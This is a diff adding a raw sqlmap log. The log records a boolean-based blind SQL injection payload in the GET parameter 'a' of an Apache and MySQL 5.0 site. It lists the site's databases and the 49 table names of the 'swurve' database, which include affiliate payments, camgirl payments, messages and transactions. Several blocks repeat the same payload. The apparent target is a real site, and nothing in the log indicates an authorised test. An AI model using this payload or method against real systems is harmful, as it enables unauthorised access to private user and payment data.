@@ -1,0 +1,122 @@
+sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+available databases [3]:
+[*] information_schema
+[*] mysql
+[*] swurve
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+Database: swurve
+[49 tables]
++--------------------------------+
+| unread\\\\\\\\\\\\\\\\x04      |
+| unread\\\\\\\\x04              |
+| unread\\\\x04                  |
+| unread\\x04                    |
+| unread\x04                     |
+| adminlog                       |
+| affiliate_bannerads            |
+| affiliate_bannerads_categories |
+| affiliate_campaigns            |
+| affiliate_categories           |
+| affiliate_payments             |
+| affiliate_payouts              |
+| affiliate_stats                |
+| affiliate_subs                 |
+| affiliates                     |
+| blocks                         |
+| camgirl_payments               |
+| camgirls                       |
+| chat_tracker                   |
+| chats                          |
+| cities                         |
+| contact_types                  |
+| contacts                       |
+| countries                      |
+| feed_types                     |
+| feeds                          |
+| filters                        |
+| geoads                         |
+| iplocationdb_country           |
+| iplocationdb_ip                |
+| iplocationdb_isp               |
+| iplocationdb_location          |
+| iplocationdb_organization      |
+| iplocationdb_region            |
+| logs                           |
+| memberships                    |
+| message_types                  |
+| messages                       |
+| news                           |
+| online                         |
+| photos                         |
+| promo                          |
+| ratings                        |
+| regions                        |
+| relationship_types             |
+| relationship_types_users       |
+| stat_types                     |
+| templates                      |
+| transactions                   |
++--------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL 5.0
